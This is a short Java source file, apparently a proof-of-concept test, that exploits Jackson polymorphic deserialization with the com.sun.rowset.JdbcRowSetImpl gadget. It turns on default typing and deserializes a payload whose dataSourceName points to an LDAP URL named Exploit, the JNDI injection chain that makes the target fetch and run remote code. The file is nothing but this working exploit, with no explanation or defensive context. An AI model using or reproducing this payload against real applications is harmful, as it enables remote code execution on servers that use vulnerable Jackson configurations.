package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * @Author:Wadewfsssss
 */

public class JdbcRowSetImpl {

    public static void main(String[] args) throws IOException {
        String payload = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(payload, Object.class);
    }
}
